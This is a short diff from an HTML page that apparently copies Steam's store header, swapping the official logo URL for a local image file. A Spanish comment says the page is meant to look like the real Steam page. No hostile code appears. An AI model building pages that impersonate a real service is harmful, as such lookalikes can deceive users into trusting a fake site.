@@ -34,7 +34,7 @@ pagina original de steam, dando a entender como si fuera la de adeveras xd-->
       <div class="logo">
         <a href="https://store.steampowered.com/?snr=1_60_4__global-header">
           <img
-            src="https://store.cloudflare.steamstatic.com/public/shared/images/header/logo_steam.svg?t=962016"
+            src="./assets//header_logo.png"
             width="176"
             height="44"
           />
